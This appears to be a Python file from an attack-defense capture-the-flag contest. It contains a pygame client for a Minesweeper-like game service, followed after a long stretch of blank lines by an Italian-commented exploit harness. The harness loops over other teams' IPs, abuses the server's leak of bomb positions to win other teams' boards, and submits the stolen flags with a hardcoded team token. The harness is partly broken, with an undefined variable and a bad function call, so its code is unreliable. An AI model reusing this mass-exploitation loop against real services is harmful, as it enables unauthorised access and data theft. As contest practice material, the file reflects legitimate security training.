#!/usr/bin/env python3

import os
import time
import pygame

from modules.gui_utils import *
from modules.marker import Marker
from modules.client import Client

import requests, time, re, string, random, datetime
from threading import Thread, Lock
from pwn import *

# Setup pygame
pygame.init()
pygame.key.set_repeat(200, 25)
pygame.display.set_caption("MineCClicker!")
CLOCK = pygame.time.Clock()
SCREEN = pygame.display.set_mode((WIDTH, HEIGHT))

# Setup client
HOST = "10.60.34.1"#os.environ.get('HOST', None) or "127.0.0.1"
PORT = 9999#int(os.environ.get('PORT', None) or 9999)
CLIENT = Client(HOST, PORT)

# Game global variables
CURRENT_USER = None
CURRENT_BOARD = None

def main_menu():

	global CURRENT_USER

	# Title
	TITLE = Text(text="MAIN MENU")

	# Buttons
	SIGNUP_BUTTON = Button(text_input="SIGNUP", pos=(CENTER, 300))
	LOGIN_BUTTON = Button(text_input="LOGIN", pos=(CENTER, 400))
	CREATE_BOARD_BUTTON = Button(text_input="CREATE BOARD", pos=(CENTER, 500))
	LOAD_BOARD_BUTTON = Button(text_input="LOAD BOARD", pos=(CENTER, 600))
	PLAY_BUTTON = Button(text_input="PLAY", pos=(CENTER, 700))
	QUIT_BUTTON = Button(text_input="QUIT", pos=(CENTER, 800))
	buttons = [SIGNUP_BUTTON, LOGIN_BUTTON, CREATE_BOARD_BUTTON, LOAD_BOARD_BUTTON, PLAY_BUTTON, QUIT_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		# Render background and title
		SCREEN.fill(BG_COLOR)
		TITLE.render(SCREEN)
		render_image(SCREEN, LOGO, (275, 100))
		render_image(SCREEN, LOGO, (725, 100))

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)
		
		# Handle events
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:
				if QUIT_BUTTON.checkForInput(event.pos):
					gui_quit()
				if SIGNUP_BUTTON.checkForInput(event.pos):
					gui_signup()
					break
				if LOGIN_BUTTON.checkForInput(event.pos):
					gui_login()
					break
				
				# All the remaining commands require login
				if CURRENT_USER is None:
					gui_message("You must be logged in!")
					break

				if CREATE_BOARD_BUTTON.checkForInput(event.pos):
					gui_create_board()
					break
				if LOAD_BOARD_BUTTON.checkForInput(event.pos):
					gui_load_board()
					break
				if PLAY_BUTTON.checkForInput(event.pos):
					if CURRENT_BOARD is None:
						gui_message("You must load a board!")
						break
					_, msg = gui_play()
					gui_message(msg)
					break

		pygame.display.flip()

def gui_signup():

	# Title
	TITLE = Text(text="SIGNUP USER")

	# Input texts
	username = TextInput(placeholder="Username", y=250)
	password = TextInput(placeholder="Password", y=350)
	
	# Buttons
	SEND_BUTTON = Button(text_input="SEND", pos=(CENTER, 550))
	MENU_BUTTON = Button(text_input="MAIN MENU", pos=(CENTER, 650))
	buttons = [SEND_BUTTON, MENU_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		# Render background and title
		SCREEN.fill(BG_COLOR)
		TITLE.render(SCREEN)

		# Render input texts
		events = pygame.event.get()
		username.render(events, SCREEN)
		password.render(events, SCREEN)

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)

		# Handle events
		for event in events:
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:

				# Handle clicks on input texts
				username.click(event.pos)
				password.click(event.pos)

				if MENU_BUTTON.checkForInput(event.pos):
					return

				if SEND_BUTTON.checkForInput(event.pos):
					if not username.isValid or not password.isValid:
						continue
					# Send signup request
					res, msg = CLIENT.signup(username.value, password.value)
					if not res:
						gui_message(msg)
					else:
						gui_message("User signed up!")
					return

		pygame.display.flip()
	
def gui_login():

	global CURRENT_USER

	# Title
	TITLE = Text(text="LOGIN USER")
	
	# Input texts
	username = TextInput(placeholder="Username", y=250)
	password = TextInput(placeholder="Password", y=350)

	# Buttons
	SEND_BUTTON = Button(text_input="SEND", pos=(CENTER, 550))
	MENU_BUTTON = Button(text_input="MAIN MENU", pos=(CENTER, 650))
	buttons = [SEND_BUTTON, MENU_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		# Render background and title
		SCREEN.fill(BG_COLOR)
		TITLE.render(SCREEN)

		# Render input texts
		events = pygame.event.get()
		username.render(events, SCREEN)
		password.render(events, SCREEN)

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)

		# Handle events
		for event in events:
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:

				# Handle clicks on input texts
				username.click(event.pos)
				password.click(event.pos)

				if MENU_BUTTON.checkForInput(event.pos):
					return

				if SEND_BUTTON.checkForInput(event.pos):
					if not username.isValid or not password.isValid:
						continue
					# Send login request
					res, msg = CLIENT.login(username.value, password.value)
					if not res:
						gui_message(msg)
					else:
						gui_message(f"Welcome back!")
						CURRENT_USER = username.value
					return  

		pygame.display.flip()

def gui_create_board():
	
	# Title
	TITLE = Text(text="CREATE BOARD")
	
	# Input texts
	name = TextInput(placeholder="Name", y=250)
	secret = TextInput(placeholder="Secret", y=350)
	seed = NumericInput(placeholder="Seed", y=450, max_value=2**64)
	board_dim = NumericInput(placeholder="Board dimension", y=550, max_value=BOARD_MAX_DIMENSION)
	num_bombs = NumericInput(placeholder="Number of bombs", y=650, max_value=BOARD_MAX_DIMENSION*BOARD_MAX_DIMENSION)

	# Buttons
	SEND_BUTTON = Button(text_input="SEND", pos=(CENTER, 750))
	MENU_BUTTON = Button(text_input="MAIN MENU", pos=(CENTER, 850))
	buttons = [SEND_BUTTON, MENU_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		# Render background and title
		SCREEN.fill(BG_COLOR)
		TITLE.render(SCREEN)

		# Render input texts
		events = pygame.event.get()
		name.render(events, SCREEN)
		secret.render(events, SCREEN)
		seed.render(events, SCREEN)
		board_dim.render(events, SCREEN)
		num_bombs.render(events, SCREEN)

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)

		# Handle events
		for event in events:
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:

				# Handle clicks on input texts
				name.click(event.pos)
				secret.click(event.pos)
				seed.click(event.pos)
				board_dim.click(event.pos)
				num_bombs.click(event.pos)
						
				if MENU_BUTTON.checkForInput(event.pos):
					return

				if SEND_BUTTON.checkForInput(event.pos):
					if not name.isValid or not secret.isValid or not seed.isValid or not board_dim.isValid or not num_bombs.isValid:
						continue
					if num_bombs.value > board_dim.value*board_dim.value:
						gui_message("Too many bombs!")
						return
					# Send create board request
					res, msg = CLIENT.create_board(name.value, secret.value, seed.value, board_dim.value, num_bombs.value)
					if not res:
						gui_message(msg)
					else:
						gui_message(f"Board created!")
					return

		pygame.display.flip()
		
def gui_load_board():

	global CURRENT_BOARD
	
	# Title
	TITLE = Text("LOAD BOARD")
	
	# Input texts
	boardname = TextInput(placeholder="Name", y=250)

	# Buttons
	SEND_BUTTON = Button(text_input="SEND", pos=(CENTER, 550))
	MENU_BUTTON = Button(text_input="MAIN MENU", pos=(CENTER, 650))
	buttons = [SEND_BUTTON, MENU_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		# Render background and title
		SCREEN.fill(BG_COLOR)
		TITLE.render(SCREEN)

		# Render input texts
		events = pygame.event.get()
		boardname.render(events, SCREEN)

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)

		# Handle events
		for event in events:
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:

				# Handle clicks on input texts
				boardname.click(event.pos)

				if MENU_BUTTON.checkForInput(event.pos):
					return

				if SEND_BUTTON.checkForInput(event.pos):
					if not boardname.isValid:
						continue
					# Send load board request
					res, msg = CLIENT.load_board(boardname.value)
					if not res:
						gui_message(msg)
					else:
						gui_message(f"Board loaded!")
						CURRENT_BOARD = boardname.value
					return  

		pygame.display.flip()

def gui_play():

	# Send play request
	res, msg = CLIENT.play()
	if not res:
		return res, msg
	
	# Initialize game
	game_seed, board_dim, num_bombs = msg
	flags_left = num_bombs
	board = [ [ Marker.COVERED for _ in range(board_dim) ] for _ in range(board_dim) ]
	graphic_board = [ [ None for _ in range(board_dim) ] for _ in range(board_dim) ]
	update_board = True
	game_over = False
	
	# Render background and logo
	SCREEN.fill(BG_COLOR)
	render_image(SCREEN, LOGO, (CENTER, 50))

	# Render seed info
	SCREEN.blit(SEED, SEED.get_rect(center=(250, 40)))
	SEED_TEXT = Text(text=f"{game_seed}", font_size=20, center=(250, 60), color=TEXT_COLOR)
	SEED_TEXT.render(SCREEN)

	# Render flags info
	SCREEN.blit(FLAG, SEED.get_rect(center=(750, 40)))
	FLAGS_TEXT = Text(text=f"{flags_left}/{num_bombs}", font_size=20, center=(750, 60), color=FLAGS_COLOR)
	FLAGS_TEXT.render(SCREEN)
	
	# Buttons
	CHECK_BUTTON = Button(text_input="CHECK BOMBS", pos=(CENTER, 950), font=25)
	buttons = [CHECK_BUTTON]
	
	while True:
		CLOCK.tick(FPS)

		if update_board and not game_over:
			render_board(SCREEN, board_dim, board, graphic_board)
			update_board = False
		
		if game_over:
			time.sleep(0.2)
			render_game_over(SCREEN, board_dim, board, graphic_board)
			time.sleep(2)
			return None, "BOOOOOOOM!"

		# Render buttons
		render_buttons(SCREEN, pygame.mouse.get_pos(), buttons)

		# Handle events
		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:

				if CHECK_BUTTON.checkForInput(event.pos):
					# Send check win request
					res, msg = CLIENT.check_win(board)
					return res, msg

				if not check_inside(event.pos, board_dim):
					continue

				# Get cell coordinates
				row, col = get_coords(event.pos, board_dim)

				# Left click: uncover cell
				if event.button == PygameClick.LEFT.value:

					# Check if cell is still uncovered
					if not check_move(board, row, col):
						continue

					# Send uncover request
					res, msg = CLIENT.uncover(row, col)
					if not res:
						return res, msg
					
					cell, curr_board = msg
					board[row][col] = Marker(cell) if cell in Marker.values() else cell
					update_board = True
					if board[row][col] == Marker.BOMB:
						for row in range(board_dim):
							for col in range(board_dim):
								if curr_board[row][col] == Marker.BOMB:
									board[row][col] = Marker.FLAG
						#game_over = True
					#break

				# Right click: flag or unflag cell
				elif event.button == PygameClick.RIGHT.value:
					
					if board[row][col] == Marker.FLAG:
						if flags_left == num_bombs:
							continue
						board[row][col] = Marker.COVERED
						flags_left += 1
					elif board[row][col] == Marker.COVERED:
						if flags_left == 0:
							continue
						board[row][col] = Marker.FLAG
						flags_left -= 1
					else:
						continue
					
					update_board = True

					# Update flags info
					FLAGS_TEXT = Text(text=f"    {flags_left}/{num_bombs}    ", font_size=20, center=(750, 60), color=FLAGS_COLOR)
					FLAGS_TEXT.render(SCREEN)
					break
		
		pygame.display.flip()

def gui_message(message, submessage=None):

	SCREEN.fill(BG_COLOR)

	MESSAGE = Text(message, font_size=40)
	MESSAGE.render(SCREEN)

	if submessage:
		SUBMESSAGE = Text(submessage, center=(CENTER, 190), font_size=35)
		SUBMESSAGE.render(SCREEN)

	MENU_BUTTON = Button(text_input="MAIN MENU", pos=(CENTER, 350))
	QUIT_BUTTON = Button(text_input="QUIT", pos=(CENTER, 450))

	while True:
		CLOCK.tick(FPS)
		pos = pygame.mouse.get_pos()

		# Render buttons
		for button in [MENU_BUTTON, QUIT_BUTTON]:
			button.changeColor(pos)
			button.update(SCREEN)

		for event in pygame.event.get():
			if event.type == pygame.QUIT:
				gui_quit()
			if event.type == pygame.MOUSEBUTTONDOWN:
				if QUIT_BUTTON.checkForInput(pos):
					gui_quit()
				if MENU_BUTTON.checkForInput(pos):
					return

		pygame.display.flip()

def gui_quit():
		
	CLIENT.quit()
	pygame.quit()
	exit()

#if __name__ == "__main__":
#	main_menu()































































































##########################################################################################################################
TEAM_TOKEN = "30079879d4f6d98c63404aca4a44caaa"			# TEAM_TOKEN INVIATO PER EMAIL
MY_TEAM = "10.60.34.1"	# IP DEL MIO TEAM
NOP_TEAM = "10.60.0.1"	# IP DEL NOP TEAM

CHALLENGE_NAME = "minecclicker"		# NOME DELLA CHALLENGE INDICATO IN flagIds
CHALLENGE_PORT = "9999"		# PORTA DELLA CHALLENGE

#######################      UTILS      ######################################

def generate_random_string(length):
	letters = string.ascii_lowercase
	result_str = ''.join(random.choice(letters) for i in range(length))
	return result_str

def generate_fake_flag():
	letters = string.ascii_uppercase + string.digits
	result_str = ''.join(random.choice(letters) for i in range(31)) + "="
	return result_str

def add_noise(url, header=None, payload=None, session=None):
	if payload == None:
		if session == None:
			if header == None:
				requests.get(url, timeout=3)
			else:
				requests.get(url, headers=header, timeout=3)
		else:
			if header == None:
				session.get(url, timeout=3)
			else:
				session.get(url, headers=header, timeout=3)
	else:
		if session == None:
			if header == None:
				requests.post(url, data=payload, timeout=3)
			else:
				requests.post(url, headers=header, data=payload, timeout=3)
		else:
			if header == None:
				session.post(url, data=payload, timeout=3)
			else:
				session.post(url, headers=header, data=payload, timeout=3)

	print(f"Rumore aggiunto - {url} : {payload}")

##############################################################################

noFlagIds = {CHALLENGE_NAME: {'10.60.0.1': [''], '10.60.1.1': [''], '10.60.2.1': [''], '10.60.3.1': [''], '10.60.4.1': [''], '10.60.5.1': [''], '10.60.6.1': [''], '10.60.7.1': [''], '10.60.8.1': [''], '10.60.9.1': [''], '10.60.10.1': [''], '10.60.11.1': [''], '10.60.12.1': [''], '10.60.13.1': [''], '10.60.14.1': [''], '10.60.15.1': [''], '10.60.16.1': [''], '10.60.17.1': [''], '10.60.18.1': [''], '10.60.19.1': [''], '10.60.20.1': [''], '10.60.21.1': [''], '10.60.22.1': [''], '10.60.23.1': [''], '10.60.24.1': [''], '10.60.25.1': [''], '10.60.26.1': [''], '10.60.27.1': [''], '10.60.28.1': [''], '10.60.29.1': [''], '10.60.30.1': [''], '10.60.31.1': [''], '10.60.32.1': [''], '10.60.33.1': [''], '10.60.34.1': [''], '10.60.35.1': [''], '10.60.36.1': [''], '10.60.37.1': [''], '10.60.38.1': [''], '10.60.39.1': [''], '10.60.40.1': [''], '10.60.41.1': ['']}}

lock = Lock()


class Attacker(Thread):
	def __init__(self, ip, flagids):
		Thread.__init__(self)
		self.ip = ip
		self.flagids = flagids
		

	def run(self):
		flag_list = []
		for hint in self.flagids[CHALLENGE_NAME][self.ip]:
			try:
				flag = get_flag(self.ip, CHALLENGE_PORT, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)
	
		lock.acquire()
		flags.extend(flag_list)
		lock.release()


def exploit_with_threads(flagids):
	c = 1
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")
		
		if ip == NOP_TEAM or ip == MY_TEAM:
			c += 1
			continue

		thread = Attacker(ip, flagids)
		threads.append(thread)
		thread.start()

		c += 1
	
	for thread in threads:
		thread.join()


def exploit(flagids):
	flag_list = []
	c = 1
	size = len(flagids[CHALLENGE_NAME])
	for ip in flagids[CHALLENGE_NAME]:
		print(f"{ip}\t-\t{c} / {size} ...")

		if ip == NOP_TEAM or ip == MY_TEAM:
			c += 1
			continue

		for hint in flagids[CHALLENGE_NAME][ip]:
			try:
				flag = get_flag(ip, CHALLENGE_PORT, hint)
				print(flag)
			except Exception as e:
				print("ERR: {}".format(e))
				continue
			if flag not in flag_list:
				flag_list.append(flag)

		c += 1
	return flag_list


# EXPLOIT FINALE CON USO DEI THREADS
def attack_with_threads():
	global flags
	global threads
	while True:
		flags = []
		threads = []
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds

		exploit_with_threads(flagids)
		
		print()
		print(flags)

		now = datetime.datetime.now()
		print(f"\nPutting flags (ORA: {now.hour}:{now.minute}:{now.second})...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(120)


# EXPLOIT FINALE
def attack():
	while True:
		print("Running exploit...")

		flagids = requests.get(f"http://10.10.0.1:8081/flagIds?service={CHALLENGE_NAME}").json()
		# flagids = noFlagIds

		flags = exploit(flagids)
		
		print()
		print(flags)

		now = datetime.datetime.now()
		print(f"\nPutting flags (ORA: {now.hour}:{now.minute}:{now.second})...")
		r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
		print(r)

		print("Exploit ok...\n\nRepeat after sleep...")
		print("\n")

		time.sleep(60)
			
	

	############################### UTILITY PER EXPLOIT ###############################
	#														 						  #
	#	- PRELEVA FLAG CON REGEX												 	  #	
	#														 						  #	
	#		- flag = re.findall("[A-Z0-9]{31}=", resp.text)[0]						  #
	#														 						  #
	#														 						  #
	#	- CHALLENGE WEB (USO DI requests)					 						  #
	# 														 						  #
	#		- session = requests.Session()					 						  #
	#														 						  #
	#		- resp = session.get(f"http://{ip}:{port}/products", timeout=1)			  #
	#														 						  #
	#		- data = {"email": hint, "password": "password"}						  #
	#		  resp = session.post(f"http://{ip}:{port}/login", data=data, timeout=1)  #
	#														 						  #
	#		- data = f"team={hint}&password=password&submit=Register"				  #
	#		  headers = {"Content-Type": "application/x-www-form-urlencoded"}		  #
	#		  resp = session.post(url, data=data, headers=headers, timeout=1)		  #
	#														 						  #
	#														 						  #
	#	- CHALLENGE NETCAT (USO DI pwntools)				 						  #
	# 														 						  #
	#		- with context.quiet:					 			  					  #
	#		  	session = remote(ip, port, timeout=1)	 			  				  #
	#			session.sendlineafter(b"> ", hint.encode(), timeout=1)			      #
	#			resp = sess_pwn.recvuntil(b"=").decode()						      #
	#														 						  #
	###################################################################################

def get_flag(ip, port, hint):
	# PASSAGGI NECESSARI A PRELEVARE UNA FLAG
	c=Client(ip,port)
	username=generate_random_string()
	password=generate_random_string()
	c.signup(username.encode(),password.encode())
	c.login(username.encode(),password.encode())
	c.load_board(hint.encode())
	msg=c.play()
	game_seed, board_dim, num_bombs = msg
	flags_left = num_bombs
	board = [ [ Marker.COVERED for _ in range(board_dim) ] for _ in range(board_dim) ]
	graphic_board = [ [ None for _ in range(board_dim) ] for _ in range(board_dim) ]
	update_board = True
	game_over = False
	for row in range(board_dim):
		for col in range(board_dim):
			if curr_board[row][col] == Marker.BOMB:
				board[row][col] = Marker.FLAG
	flag=c.check_win(board)
	print(flag)

		


	################
	

	
	# RESTITUISCI LA FLAG
	return flag
	


## TEST get_flag
def test():
	ip = "10.60.34.1"
	hint = "j18g6VkA6gqwBigip6BK7R24l"

	try:
		flag = get_flag(ip, CHALLENGE_PORT, hint)
	except Exception as e:
		print(f"ERR: {e}")
		return
	
	print(flag)
	
	# flags = [flag]
	# print("\nPutting flags...")
	# r = requests.put('http://10.10.0.1:8080/flags', headers={'X-Team-Token': TEAM_TOKEN}, json=flags).text
	# print(r)


def main():
	test()
	# attack()
	# attack_with_threads()


main()









